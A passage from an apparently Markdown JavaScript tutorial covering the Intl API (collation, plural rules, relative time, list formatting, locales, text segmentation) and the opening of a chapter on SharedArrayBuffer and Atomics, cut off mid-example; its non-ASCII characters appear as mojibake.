// Swedish - Ã¤ comes after z
console.log(words.sort(new Intl.Collator('sv').compare));
// ['a', 'z', 'Ã¤']
```

**Case Sensitivity:**

```javascript
const items = ['Apple', 'banana', 'CHERRY', 'date'];

// Case-sensitive (default)
console.log(items.sort(new Intl.Collator('en', {
  sensitivity: 'case'
}).compare));
// ['Apple', 'CHERRY', 'banana', 'date']

// Case-insensitive
console.log(items.sort(new Intl.Collator('en', {
  sensitivity: 'base'
}).compare));
// ['Apple', 'banana', 'CHERRY', 'date']
```

**Sensitivity Options:**

```javascript
const collatorBase = new Intl.Collator('en', { sensitivity: 'base' });
const collatorAccent = new Intl.Collator('en', { sensitivity: 'accent' });
const collatorCase = new Intl.Collator('en', { sensitivity: 'case' });
const collatorVariant = new Intl.Collator('en', { sensitivity: 'variant' });

// 'base': only base letters differ
console.log(collatorBase.compare('a', 'Ã¡')); // 0 (equal)
console.log(collatorBase.compare('a', 'A')); // 0 (equal)

// 'accent': accents matter, case doesn't
console.log(collatorAccent.compare('a', 'Ã¡')); // -1 (different)
console.log(collatorAccent.compare('a', 'A')); // 0 (equal)

// 'case': case matters, accents don't
console.log(collatorCase.compare('a', 'Ã¡')); // 0 (equal)
console.log(collatorCase.compare('a', 'A')); // -1 (different)

// 'variant': both matter
console.log(collatorVariant.compare('a', 'Ã¡')); // -1 (different)
console.log(collatorVariant.compare('a', 'A')); // -1 (different)
```

### Sorting with Locale Awareness

Using Collator for proper locale-aware sorting.

**Numeric Sorting:**

```javascript
const files = ['file1.txt', 'file10.txt', 'file2.txt', 'file20.txt'];

// Default string sort (incorrect for numbers)
console.log(files.sort());
// ['file1.txt', 'file10.txt', 'file2.txt', 'file20.txt']

// Numeric collator
const numericCollator = new Intl.Collator('en', { numeric: true });
console.log(files.sort(numericCollator.compare));
// ['file1.txt', 'file2.txt', 'file10.txt', 'file20.txt']
```

**Ignoring Punctuation:**

```javascript
const words = ['coop', 'co-op', 'coÃ¶p'];

// With punctuation
console.log(words.sort(new Intl.Collator('en').compare));
// ['co-op', 'coop', 'coÃ¶p']

// Ignore punctuation
console.log(words.sort(new Intl.Collator('en', {
  ignorePunctuation: true
}).compare));
// ['coop', 'co-op', 'coÃ¶p']
```

**Complex Sorting Example:**

```javascript
const contacts = [
  { name: 'MÃ¼ller', city: 'Berlin' },
  { name: 'SMITH', city: 'London' },
  { name: 'zhang', city: 'Beijing' },
  { name: 'Ã˜berg', city: 'Oslo' }
];

// Sort by name (case-insensitive, locale-aware)
const nameCollator = new Intl.Collator('en', {
  sensitivity: 'base',
  usage: 'sort'
});

contacts.sort((a, b) => nameCollator.compare(a.name, b.name));

console.log(contacts.map(c => c.name));
// ['MÃ¼ller', 'Ã˜berg', 'SMITH', 'zhang']
```

**Search Usage:**

```javascript
// For searching (more lenient)
const searchCollator = new Intl.Collator('en', {
  usage: 'search',
  sensitivity: 'base'
});

function searchInList(list, query) {
  return list.filter(item => 
    searchCollator.compare(item, query) === 0
  );
}

const items = ['cafÃ©', 'CAFÃ‰', 'CafÃ©', 'cafe'];
console.log(searchInList(items, 'cafe'));
// ['cafÃ©', 'CAFÃ‰', 'CafÃ©', 'cafe'] (all match)
```

**Practical Sorting Examples:**

```javascript
// Multi-field sorting
function createSorter(fields, locales = 'en') {
  const collators = fields.map(field => ({
    key: field.key,
    collator: new Intl.Collator(locales, field.options || {})
  }));
  
  return function(a, b) {
    for (const { key, collator } of collators) {
      const result = collator.compare(a[key], b[key]);
      if (result !== 0) return result;
    }
    return 0;
  };
}

const users = [
  { lastName: 'Smith', firstName: 'John', age: 30 },
  { lastName: 'Smith', firstName: 'Alice', age: 25 },
  { lastName: 'Johnson', firstName: 'Bob', age: 35 }
];

const sorter = createSorter([
  { key: 'lastName', options: { sensitivity: 'base' } },
  { key: 'firstName', options: { sensitivity: 'base' } }
]);

users.sort(sorter);
console.log(users);
// Sorted by lastName, then firstName
```

---

## 18.4 Intl.PluralRules

The Intl.PluralRules object enables plural-sensitive formatting.

### Plural Form Selection

Determining the correct plural form for different locales.

**Basic Usage:**

```javascript
const enRules = new Intl.PluralRules('en-US');

console.log(enRules.select(0)); // "other"
console.log(enRules.select(1)); // "one"
console.log(enRules.select(2)); // "other"
console.log(enRules.select(5)); // "other"

// Different locales have different rules
const arRules = new Intl.PluralRules('ar-EG');

console.log(arRules.select(0)); // "zero"
console.log(arRules.select(1)); // "one"
console.log(arRules.select(2)); // "two"
console.log(arRules.select(5)); // "few"
console.log(arRules.select(11)); // "many"
console.log(arRules.select(100)); // "other"
```

**Ordinal vs Cardinal:**

```javascript
// Cardinal (default) - for counting
const cardinalRules = new Intl.PluralRules('en-US', {
  type: 'cardinal'
});

console.log(cardinalRules.select(1)); // "one"
console.log(cardinalRules.select(2)); // "other"
console.log(cardinalRules.select(3)); // "other"

// Ordinal - for ordering (1st, 2nd, 3rd, etc.)
const ordinalRules = new Intl.PluralRules('en-US', {
  type: 'ordinal'
});

console.log(ordinalRules.select(1)); // "one" (1st)
console.log(ordinalRules.select(2)); // "two" (2nd)
console.log(ordinalRules.select(3)); // "few" (3rd)
console.log(ordinalRules.select(4)); // "other" (4th)
console.log(ordinalRules.select(21)); // "one" (21st)
console.log(ordinalRules.select(22)); // "two" (22nd)
```

**Building Plural Messages:**

```javascript
function pluralize(count, singular, plural, locale = 'en-US') {
  const rules = new Intl.PluralRules(locale);
  const form = rules.select(count);
  
  const forms = {
    one: singular,
    other: plural
  };
  
  return `${count} ${forms[form] || plural}`;
}

console.log(pluralize(0, 'apple', 'apples')); // "0 apples"
console.log(pluralize(1, 'apple', 'apples')); // "1 apple"
console.log(pluralize(5, 'apple', 'apples')); // "5 apples"
```

**Complex Plural Rules:**

```javascript
function createPluralizer(locale, forms) {
  const rules = new Intl.PluralRules(locale);
  
  return function(count) {
    const form = rules.select(count);
    const template = forms[form] || forms.other;
    return template.replace('{count}', count);
  };
}

// English (simple: one/other)
const enPlural = createPluralizer('en-US', {
  one: '{count} item',
  other: '{count} items'
});

console.log(enPlural(0)); // "0 items"
console.log(enPlural(1)); // "1 item"
console.log(enPlural(5)); // "5 items"

// Polish (complex: one/few/many/other)
const plPlural = createPluralizer('pl-PL', {
  one: '{count} plik',
  few: '{count} pliki',
  many: '{count} plikÃ³w',
  other: '{count} pliku'
});

console.log(plPlural(1)); // "1 plik"
console.log(plPlural(2)); // "2 pliki"
console.log(plPlural(5)); // "5 plikÃ³w"
console.log(plPlural(1.5)); // "1.5 pliku"

// Arabic (very complex: zero/one/two/few/many/other)
const arPlural = createPluralizer('ar-EG', {
  zero: 'Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¹Ù†Ø§ØµØ±',
  one: 'Ø¹Ù†ØµØ± ÙˆØ§Ø­Ø¯',
  two: 'Ø¹Ù†ØµØ±Ø§Ù†',
  few: '{count} Ø¹Ù†Ø§ØµØ±',
  many: '{count} Ø¹Ù†ØµØ±Ø§Ù‹',
  other: '{count} Ø¹Ù†ØµØ±'
});

console.log(arPlural(0)); // "Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¹Ù†Ø§ØµØ±"
console.log(arPlural(1)); // "Ø¹Ù†ØµØ± ÙˆØ§Ø­Ø¯"
console.log(arPlural(2)); // "Ø¹Ù†ØµØ±Ø§Ù†"
console.log(arPlural(5)); // "5 Ø¹Ù†Ø§ØµØ±"
console.log(arPlural(11)); // "11 Ø¹Ù†ØµØ±Ø§Ù‹"
```

**Ordinal Number Suffixes:**

```javascript
function getOrdinalSuffix(number, locale = 'en-US') {
  const ordinalRules = new Intl.PluralRules(locale, { type: 'ordinal' });
  const form = ordinalRules.select(number);
  
  const suffixes = {
    'en-US': {
      one: 'st',
      two: 'nd',
      few: 'rd',
      other: 'th'
    }
  };
  
  const localeSuffixes = suffixes[locale] || suffixes['en-US'];
  return number + localeSuffixes[form];
}

console.log(getOrdinalSuffix(1)); // "1st"
console.log(getOrdinalSuffix(2)); // "2nd"
console.log(getOrdinalSuffix(3)); // "3rd"
console.log(getOrdinalSuffix(4)); // "4th"
console.log(getOrdinalSuffix(21)); // "21st"
console.log(getOrdinalSuffix(22)); // "22nd"
console.log(getOrdinalSuffix(23)); // "23rd"
console.log(getOrdinalSuffix(24)); // "24th"
```

---

## 18.5 Intl.RelativeTimeFormat

The Intl.RelativeTimeFormat object enables language-sensitive relative time formatting.

### Relative Time Formatting ("2 days ago")

Formatting time differences in human-readable relative terms.

**Basic Usage:**

```javascript
const rtf = new Intl.RelativeTimeFormat('en-US');

// Past
console.log(rtf.format(-1, 'day')); // "1 day ago"
console.log(rtf.format(-2, 'day')); // "2 days ago"
console.log(rtf.format(-1, 'week')); // "1 week ago"

// Future
console.log(rtf.format(1, 'day')); // "in 1 day"
console.log(rtf.format(2, 'day')); // "in 2 days"
console.log(rtf.format(1, 'week')); // "in 1 week"

// Different units
console.log(rtf.format(-30, 'second')); // "30 seconds ago"
console.log(rtf.format(-5, 'minute')); // "5 minutes ago"
console.log(rtf.format(-2, 'hour')); // "2 hours ago"
console.log(rtf.format(-3, 'month')); // "3 months ago"
console.log(rtf.format(-1, 'year')); // "1 year ago"
```

**Style Options:**

```javascript
const value = -2;
const unit = 'day';

// Long style (default)
console.log(new Intl.RelativeTimeFormat('en-US', {
  style: 'long'
}).format(value, unit));
// "2 days ago"

// Short style
console.log(new Intl.RelativeTimeFormat('en-US', {
  style: 'short'
}).format(value, unit));
// "2 days ago"

// Narrow style
console.log(new Intl.RelativeTimeFormat('en-US', {
  style: 'narrow'
}).format(value, unit));
// "2 days ago"
```

**Numeric Options:**

```javascript
const rtfAuto = new Intl.RelativeTimeFormat('en-US', {
  numeric: 'auto'
});

const rtfAlways = new Intl.RelativeTimeFormat('en-US', {
  numeric: 'always'
});

// Auto uses words when possible
console.log(rtfAuto.format(-1, 'day')); // "yesterday"
console.log(rtfAuto.format(0, 'day')); // "today"
console.log(rtfAuto.format(1, 'day')); // "tomorrow"
console.log(rtfAuto.format(-2, 'day')); // "2 days ago"

// Always uses numbers
console.log(rtfAlways.format(-1, 'day')); // "1 day ago"
console.log(rtfAlways.format(0, 'day')); // "in 0 days"
console.log(rtfAlways.format(1, 'day')); // "in 1 day"
console.log(rtfAlways.format(-2, 'day')); // "2 days ago"
```

**Different Locales:**

```javascript
const value = -3;
const unit = 'day';

console.log(new Intl.RelativeTimeFormat('en-US').format(value, unit));
// "3 days ago"

console.log(new Intl.RelativeTimeFormat('es-ES').format(value, unit));
// "hace 3 dÃ­as"

console.log(new Intl.RelativeTimeFormat('fr-FR').format(value, unit));
// "il y a 3 jours"

console.log(new Intl.RelativeTimeFormat('de-DE').format(value, unit));
// "vor 3 Tagen"

console.log(new Intl.RelativeTimeFormat('ja-JP').format(value, unit));
// "3 æ—¥å‰"

console.log(new Intl.RelativeTimeFormat('ar-EG').format(value, unit));
// "Ù…Ù†Ø° Ù£ Ø£ÙŠØ§Ù…"
```

**formatToParts Method:**

```javascript
const rtf = new Intl.RelativeTimeFormat('en-US');

const parts = rtf.formatToParts(-2, 'day');
console.log(parts);
/*
[
  { type: 'integer', value: '2', unit: 'day' },
  { type: 'literal', value: ' ' },
  { type: 'unit', value: 'days' },
  { type: 'literal', value: ' ' },
  { type: 'literal', value: 'ago' }
]
*/

// Build custom format
const customFormat = parts
  .map(part => {
    if (part.type === 'integer') return `**${part.value}**`;
    return part.value;
  })
  .join('');

console.log(customFormat); // "**2** days ago"
```

**Practical Time Difference Calculator:**

```javascript
function getRelativeTime(date, locale = 'en-US') {
  const rtf = new Intl.RelativeTimeFormat(locale, { numeric: 'auto' });
  const now = new Date();
  const diff = date - now;
  
  const second = 1000;
  const minute = second * 60;
  const hour = minute * 60;
  const day = hour * 24;
  const week = day * 7;
  const month = day * 30;
  const year = day * 365;
  
  if (Math.abs(diff) < minute) {
    const value = Math.round(diff / second);
    return rtf.format(value, 'second');
  } else if (Math.abs(diff) < hour) {
    const value = Math.round(diff / minute);
    return rtf.format(value, 'minute');
  } else if (Math.abs(diff) < day) {
    const value = Math.round(diff / hour);
    return rtf.format(value, 'hour');
  } else if (Math.abs(diff) < week) {
    const value = Math.round(diff / day);
    return rtf.format(value, 'day');
  } else if (Math.abs(diff) < month) {
    const value = Math.round(diff / week);
    return rtf.format(value, 'week');
  } else if (Math.abs(diff) < year) {
    const value = Math.round(diff / month);
    return rtf.format(value, 'month');
  } else {
    const value = Math.round(diff / year);
    return rtf.format(value, 'year');
  }
}

// Test with various dates
const now = new Date();

console.log(getRelativeTime(new Date(now.getTime() - 30000))); // "30 seconds ago"
console.log(getRelativeTime(new Date(now.getTime() - 3600000))); // "1 hour ago"
console.log(getRelativeTime(new Date(now.getTime() - 86400000))); // "yesterday"
console.log(getRelativeTime(new Date(now.getTime() + 86400000))); // "tomorrow"
console.log(getRelativeTime(new Date(now.getTime() + 604800000))); // "next week"
```

---

## 18.6 Intl.ListFormat

The Intl.ListFormat object enables language-sensitive list formatting.

### List Formatting

Formatting lists of items with proper conjunctions and separators.

**Basic Usage:**

```javascript
const items = ['apple', 'banana', 'cherry'];

// Conjunction (and)
console.log(new Intl.ListFormat('en-US', {
  style: 'long',
  type: 'conjunction'
}).format(items));
// "apple, banana, and cherry"

// Disjunction (or)
console.log(new Intl.ListFormat('en-US', {
  style: 'long',
  type: 'disjunction'
}).format(items));
// "apple, banana, or cherry"

// Unit (no conjunction)
console.log(new Intl.ListFormat('en-US', {
  style: 'long',
  type: 'unit'
}).format(items));
// "apple, banana, cherry"
```

**Style Options:**

```javascript
const items = ['apple', 'banana', 'cherry'];

// Long style
console.log(new Intl.ListFormat('en-US', {
  style: 'long',
  type: 'conjunction'
}).format(items));
// "apple, banana, and cherry"

// Short style
console.log(new Intl.ListFormat('en-US', {
  style: 'short',
  type: 'conjunction'
}).format(items));
// "apple, banana, & cherry"

// Narrow style
console.log(new Intl.ListFormat('en-US', {
  style: 'narrow',
  type: 'conjunction'
}).format(items));
// "apple, banana, cherry"
```

**Different Locales:**

```javascript
const items = ['apple', 'banana', 'cherry'];

console.log(new Intl.ListFormat('en-US').format(items));
// "apple, banana, and cherry"

console.log(new Intl.ListFormat('es-ES').format(items));
// "apple, banana y cherry"

console.log(new Intl.ListFormat('fr-FR').format(items));
// "apple, banana et cherry"

console.log(new Intl.ListFormat('de-DE').format(items));
// "apple, banana und cherry"

console.log(new Intl.ListFormat('ja-JP').format(items));
// "appleã€bananaã€cherry"

console.log(new Intl.ListFormat('ar-EG').format(items));
// "apple Ùˆ banana Ùˆ cherry"
```

**Two Items:**

```javascript
const twoItems = ['apple', 'banana'];

console.log(new Intl.ListFormat('en-US', {
  type: 'conjunction'
}).format(twoItems));
// "apple and banana"

console.log(new Intl.ListFormat('en-US', {
  type: 'disjunction'
}).format(twoItems));
// "apple or banana"
```

**One Item:**

```javascript
const oneItem = ['apple'];

console.log(new Intl.ListFormat('en-US').format(oneItem));
// "apple"
```

**formatToParts Method:**

```javascript
const items = ['apple', 'banana', 'cherry'];
const formatter = new Intl.ListFormat('en-US', { type: 'conjunction' });

const parts = formatter.formatToParts(items);
console.log(parts);
/*
[
  { type: 'element', value: 'apple' },
  { type: 'literal', value: ', ' },
  { type: 'element', value: 'banana' },
  { type: 'literal', value: ', and ' },
  { type: 'element', value: 'cherry' }
]
*/

// Build custom format
const customFormat = parts
  .map(part => {
    if (part.type === 'element') return `"${part.value}"`;
    return part.value;
  })
  .join('');

console.log(customFormat); // '"apple", "banana", and "cherry"'
```

**Practical Examples:**

```javascript
// Format user names
function formatUsernames(users, locale = 'en-US') {
  const names = users.map(u => u.name);
  return new Intl.ListFormat(locale, {
    type: 'conjunction'
  }).format(names);
}

const users = [
  { name: 'Alice' },
  { name: 'Bob' },
  { name: 'Charlie' }
];

console.log(formatUsernames(users));
// "Alice, Bob, and Charlie"

// Format file names
function formatFileList(files, locale = 'en-US') {
  const formatter = new Intl.ListFormat(locale, {
    style: 'narrow',
    type: 'unit'
  });
  
  return `${files.length} files: ${formatter.format(files)}`;
}

console.log(formatFileList(['doc1.pdf', 'doc2.pdf', 'doc3.pdf']));
// "3 files: doc1.pdf, doc2.pdf, doc3.pdf"

// Format choices
function formatChoices(choices, locale = 'en-US') {
  return new Intl.ListFormat(locale, {
    type: 'disjunction'
  }).format(choices);
}

console.log(formatChoices(['red', 'blue', 'green']));
// "red, blue, or green"
```

---

## 18.7 Intl.Locale

The Intl.Locale object represents a Unicode locale identifier.

### Locale Identification

Working with locale identifiers and their components.

**Basic Locale:**

```javascript
const locale = new Intl.Locale('en-US');

console.log(locale.baseName); // "en-US"
console.log(locale.language); // "en"
console.log(locale.region); // "US"
console.log(locale.script); // undefined
```

**Locale with Script:**

```javascript
const locale = new Intl.Locale('zh-Hans-CN');

console.log(locale.baseName); // "zh-Hans-CN"
console.log(locale.language); // "zh"
console.log(locale.script); // "Hans" (Simplified)
console.log(locale.region); // "CN"
```

**Locale Options:**

```javascript
const locale = new Intl.Locale('en-US', {
  calendar: 'gregory',
  numberingSystem: 'latn',
  hourCycle: 'h12',
  caseFirst: 'upper'
});

console.log(locale.calendar); // "gregory"
console.log(locale.numberingSystem); // "latn"
console.log(locale.hourCycle); // "h12"
console.log(locale.caseFirst); // "upper"
console.log(locale.numeric); // false
```

**Unicode Extension:**

```javascript
// Using BCP 47 language tag
const locale = new Intl.Locale('en-US-u-ca-buddhist-nu-thai');

console.log(locale.calendar); // "buddhist"
console.log(locale.numberingSystem); // "thai"
console.log(locale.baseName); // "en-US"
console.log(locale.toString()); // "en-US-u-ca-buddhist-nu-thai"
```

**Maximize and Minimize:**

```javascript
// Maximize - add likely subtags
const short = new Intl.Locale('en');
const maximized = short.maximize();

console.log(short.toString()); // "en"
console.log(maximized.toString()); // "en-Latn-US"

// Minimize - remove likely subtags
const long = new Intl.Locale('en-Latn-US');
const minimized = long.minimize();

console.log(long.toString()); // "en-Latn-US"
console.log(minimized.toString()); // "en"
```

**Locale Information:**

```javascript
function getLocaleInfo(localeString) {
  const locale = new Intl.Locale(localeString);
  
  return {
    baseName: locale.baseName,
    language: locale.language,
    script: locale.script,
    region: locale.region,
    calendar: locale.calendar,
    collation: locale.collation,
    hourCycle: locale.hourCycle,
    numberingSystem: locale.numberingSystem,
    numeric: locale.numeric,
    caseFirst: locale.caseFirst
  };
}

console.log(getLocaleInfo('zh-Hans-CN-u-ca-chinese-nu-hanidec'));
/*
{
  baseName: 'zh-Hans-CN',
  language: 'zh',
  script: 'Hans',
  region: 'CN',
  calendar: 'chinese',
  collation: undefined,
  hourCycle: 'h23',
  numberingSystem: 'hanidec',
  numeric: false,
  caseFirst: 'false'
}
*/
```

---

## 18.8 Intl.Segmenter

The Intl.Segmenter object enables locale-sensitive text segmentation.

### Text Segmentation (Graphemes, Words, Sentences)

Breaking text into meaningful units according to locale rules.

**Grapheme Segmentation:**

```javascript
// Breaking text into grapheme clusters (user-perceived characters)
const segmenter = new Intl.Segmenter('en', { granularity: 'grapheme' });

const text = 'Hello ðŸ‘‹ World ðŸŒ';
const segments = segmenter.segment(text);

for (const segment of segments) {
  console.log(segment);
}
/*
{ segment: 'H', index: 0, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: true }
{ segment: 'e', index: 1, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: true }
{ segment: 'l', index: 2, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: true }
{ segment: 'l', index: 3, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: true }
{ segment: 'o', index: 4, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: true }
{ segment: ' ', index: 5, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: false }
{ segment: 'ðŸ‘‹', index: 6, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: false }
{ segment: ' ', index: 8, input: 'Hello ðŸ‘‹ World ðŸŒ', isWordLike: false }
...
*/

// Extract just the segments
const graphemes = Array.from(segments, s => s.segment);
console.log(graphemes);
// ['H', 'e', 'l', 'l', 'o', ' ', 'ðŸ‘‹', ' ', 'W', 'o', 'r', 'l', 'd', ' ', 'ðŸŒ']
```

**Word Segmentation:**

```javascript
const segmenter = new Intl.Segmenter('en', { granularity: 'word' });

const text = 'Hello, world! How are you?';
const segments = segmenter.segment(text);

// Get only words (not punctuation/spaces)
const words = Array.from(segments)
  .filter(s => s.isWordLike)
  .map(s => s.segment);

console.log(words);
// ['Hello', 'world', 'How', 'are', 'you']

// Get all segments
for (const segment of segments) {
  console.log(`"${segment.segment}" at index ${segment.index}`);
}
/*
"Hello" at index 0
"," at index 5
" " at index 6
"world" at index 7
"!" at index 12
" " at index 13
"How" at index 14
" " at index 17
"are" at index 18
" " at index 21
"you" at index 22
"?" at index 25
*/
```

**Sentence Segmentation:**

```javascript
const segmenter = new Intl.Segmenter('en', { granularity: 'sentence' });

const text = 'Hello world. How are you? I am fine!';
const segments = segmenter.segment(text);

const sentences = Array.from(segments, s => s.segment);
console.log(sentences);
// ['Hello world. ', 'How are you? ', 'I am fine!']

// Trim sentences
const trimmed = sentences.map(s => s.trim());
console.log(trimmed);
// ['Hello world.', 'How are you?', 'I am fine!']
```

**Locale-Specific Segmentation:**

```javascript
// Thai doesn't use spaces between words
const thaiText = 'à¸ªà¸§à¸±à¸ªà¸”à¸µà¸„à¸£à¸±à¸šà¸œà¸¡à¸Šà¸·à¹ˆà¸­à¸ˆà¸­à¸«à¹Œà¸™';

const segmenter = new Intl.Segmenter('th', { granularity: 'word' });
const segments = segmenter.segment(thaiText);

const words = Array.from(segments)
  .filter(s => s.isWordLike)
  .map(s => s.segment);

console.log(words);
// ['à¸ªà¸§à¸±à¸ªà¸”à¸µ', 'à¸„à¸£à¸±à¸š', 'à¸œà¸¡', 'à¸Šà¸·à¹ˆà¸­', 'à¸ˆà¸­à¸«à¹Œà¸™']

// Japanese text
const japaneseText = 'ã“ã‚Œã¯æ—¥æœ¬èªžã®ãƒ†ã‚¹ãƒˆã§ã™';

const jpSegmenter = new Intl.Segmenter('ja', { granularity: 'word' });
const jpSegments = jpSegmenter.segment(japaneseText);

const jpWords = Array.from(jpSegments, s => s.segment);
console.log(jpWords);
// Properly segments Japanese text
```

**Practical Applications:**

```javascript
// Word counter
function countWords(text, locale = 'en') {
  const segmenter = new Intl.Segmenter(locale, { granularity: 'word' });
  const segments = segmenter.segment(text);
  
  return Array.from(segments).filter(s => s.isWordLike).length;
}

const essay = 'This is a sample essay. It has multiple sentences.';
console.log(`Word count: ${countWords(essay)}`);
// "Word count: 9"

// Sentence splitter
function splitSentences(text, locale = 'en') {
  const segmenter = new Intl.Segmenter(locale, { granularity: 'sentence' });
  const segments = segmenter.segment(text);
  
  return Array.from(segments, s => s.segment.trim()).filter(s => s);
}

const paragraph = 'First sentence. Second sentence! Third sentence?';
console.log(splitSentences(paragraph));
// ['First sentence.', 'Second sentence!', 'Third sentence?']

// Truncate to word boundary
function truncateToWord(text, maxLength, locale = 'en') {
  if (text.length <= maxLength) return text;
  
  const segmenter = new Intl.Segmenter(locale, { granularity: 'word' });
  const segments = Array.from(segmenter.segment(text));
  
  let result = '';
  for (const segment of segments) {
    if (result.length + segment.segment.length > maxLength) {
      break;
    }
    result += segment.segment;
  }
  
  return result.trim() + '...';
}

const longText = 'This is a very long text that needs to be truncated at a word boundary';
console.log(truncateToWord(longText, 30));
// "This is a very long text..."

// Extract first N words
function getFirstWords(text, count, locale = 'en') {
  const segmenter = new Intl.Segmenter(locale, { granularity: 'word' });
  const segments = segmenter.segment(text);
  
  const words = Array.from(segments).filter(s => s.isWordLike);
  return words.slice(0, count).map(s => s.segment).join(' ');
}

const article = 'JavaScript is a versatile programming language used for web development';
console.log(getFirstWords(article, 5));
// "JavaScript is a versatile programming"
```

---

## Summary

This document covered Internationalization (Intl) comprehensively:

- **Intl.DateTimeFormat**: Locale-aware date/time formatting with extensive options for date styles, time styles, components, and time zones
- **Intl.NumberFormat**: Number, currency, and unit formatting with compact notation and various display options
- **Intl.Collator**: Locale-aware string comparison and sorting with sensitivity and numeric options
- **Intl.PluralRules**: Determining correct plural forms for different locales (cardinal and ordinal)
- **Intl.RelativeTimeFormat**: Formatting relative time ("2 days ago") with style and numeric options
- **Intl.ListFormat**: Formatting lists with proper conjunctions and separators
- **Intl.Locale**: Working with locale identifiers and their components
- **Intl.Segmenter**: Text segmentation into graphemes, words, and sentences

The Intl API enables building truly internationalized applications that adapt to users' languages and cultural conventions.

---

**Related Topics to Explore Next:**

- ICU MessageFormat for complex message formatting
- Unicode and character encoding
- Right-to-left (RTL) text handling
- Locale negotiation strategies
- Translation management systems
---

**End of Chapter 18**


# 19-Atomics-and-SharedArrayBuffer.md

# 19 Atomics and SharedArrayBuffer

---

# JavaScript Deep Dive: Atomics and SharedArrayBuffer


## 19.1 SharedArrayBuffer

SharedArrayBuffer allows multiple workers to share the same memory, enabling true multi-threading in JavaScript.

### Creating Shared Memory

SharedArrayBuffer creates a fixed-length raw binary buffer that can be shared between workers.

**Basic Creation:**

```javascript
// Create a shared buffer of 1024 bytes
const sharedBuffer = new SharedArrayBuffer(1024);

console.log(sharedBuffer.byteLength); // 1024
console.log(sharedBuffer instanceof SharedArrayBuffer); // true

// Create a view on the shared buffer
const sharedArray = new Int32Array(sharedBuffer);

console.log(sharedArray.length); // 256 (1024 bytes / 4 bytes per Int32)
console.log(sharedArray.buffer === sharedBuffer); // true

// Write to shared memory
sharedArray[0] = 42;
sharedArray[1] = 100;

console.log(sharedArray[0]); // 42
```

**Different Typed Array Views:**

```javascript
// Create 1KB shared buffer
const sab = new SharedArrayBuffer(1024);

// Different views on the same memory
const int8View = new Int8Array(sab);      // 1024 elements (1 byte each)
const int16View = new Int16Array(sab);    // 512 elements (2 bytes each)
const int32View = new Int32Array(sab);    // 256 elements (4 bytes each)
const uint8View = new Uint8Array(sab);    // 1024 elements (1 byte each)
const float32View = new Float32Array(sab); // 256 elements (4 bytes each)
const float64View = new Float64Array(sab); // 128 elements (8 bytes each)

// Writing to one view affects others (same memory)
int32View[0] = 0x12345678;

console.log(int32View[0].toString(16)); // 12345678
console.log(int8View[0].toString(16));  // 78 (least significant byte)
console.log(int8View[1].toString(16));  // 56
console.log(int8View[2].toString(16));  // 34
console.log(int8View[3].toString(16));  // 12 (most significant byte)
```

**Memory Layout:**

```javascript
const sab = new SharedArrayBuffer(16);
const view = new Int32Array(sab);

// Memory layout visualization
// Byte offset: 0  1  2  3  | 4  5  6  7  | 8  9  10 11 | 12 13 14 15
// Int32[0]:   [  value 0  ] [  value 1  ] [  value 2  ] [  value 3  ]

view[0] = 100;  // Bytes 0-3
view[1] = 200;  // Bytes 4-7
view[2] = 300;  // Bytes 8-11
view[3] = 400;  // Bytes 12-15

// Accessing as bytes
const byteView = new Uint8Array(sab);
console.log('Bytes:', Array.from(byteView));
```

**Structured Data in Shared Memory:**

```javascript
// Define a structure layout
class SharedStruct {
  constructor(sab, offset = 0) {
    this.buffer = sab;
    this.offset = offset;
    
    // Layout: | id (4 bytes) | x (4 bytes) | y (4 bytes) | flags (4 bytes) |
    this.view = new Int32Array(sab, offset, 4);
  }
  
  get id() { return this.view[0]; }
  set id(value) { this.view[0] = value; }
  
  get x() { return this.view[1]; }
  set x(value) { this.view[1] = value; }
  
  get y() { return this.view[2]; }
  set y(value) { this.view[2] = value; }
  
  get flags() { return this.view[3]; }
  set flags(value) { this.view[3] = value; }
  
  static SIZE = 16; // 4 integers Ã— 4 bytes
}

// Create shared buffer for multiple structs
const sab = new SharedArrayBuffer(SharedStruct.SIZE * 10);

// Create instances pointing to different offsets
const struct1 = new SharedStruct(sab, 0);
const struct2 = new SharedStruct(sab, SharedStruct.SIZE);

struct1.id = 1;
struct1.x = 100;
struct1.y = 200;

struct2.id = 2;
struct2.x = 300;
struct2.y = 400;

console.log('Struct 1:', struct1.id, struct1.x, struct1.y);
console.log('Struct 2:', struct2.id, struct2.x, struct2.y);
```

### Sharing Between Workers

SharedArrayBuffer can be passed between the main thread and workers, allowing them to share memory.

**Main Thread:**

```javascript
// main.js

// Create shared buffer
const sharedBuffer = new SharedArrayBuffer(1024);
const sharedArray = new Int32Array(sharedBuffer);

// Initialize some values
sharedArray[0] = 0; // Counter
sharedArray[1] = 0; // Flag

// Create worker
const worker = new Worker('worker.js');

// Send shared buffer to worker
worker.postMessage({
  type: 'init',
  sharedBuffer: sharedBuffer
});

// Listen for messages from worker
worker.addEventListener('message', (event) => {
  if (event.data.type === 'result') {
    console.log('Worker result:', event.data.value);
  }
});

// Main thread can also modify shared memory
setInterval(() => {
  const counter = sharedArray[0];
  console.log('Main thread sees counter:', counter);
}, 1000);
```

**Worker Thread:**

```javascript
// worker.js

let sharedArray;

self.addEventListener('message', (event) => {
  if (event.data.type === 'init') {
    // Receive shared buffer
    const sharedBuffer = event.data.sharedBuffer;
    sharedArray = new Int32Array(sharedBuffer);
    
    console.log('Worker received shared buffer');
    
    // Start incrementing counter
    setInterval(() => {
      // Atomically increment counter
      const oldValue = Atomics.add(sharedArray, 0, 1);
      
      console.log('Worker incremented counter from', oldValue, 'to', oldValue + 1);
    }, 500);
  }
});
```

**Producer-Consumer Pattern:**

```javascript
// main.js - Producer

const BUFFER_SIZE = 10;
const sab = new SharedArrayBuffer(Int32Array.BYTES_PER_ELEMENT * (BUFFER_SIZE + 2));
const sharedArray = new Int32Array(sab);

// Layout: [writeIndex, readIndex, ...buffer]
const WRITE_INDEX = 0;
const READ_INDEX = 1;
const BUFFER_START = 2;

// Initialize
sharedArray[WRITE_INDEX] = 0;
sharedArray[READ_INDEX] = 0;

const worker = new Worker('consumer-worker.js');
worker.postMessage({ sharedBuffer: sab });

// Producer: Write data to buffer
let produced = 0;
setInterval(() => {
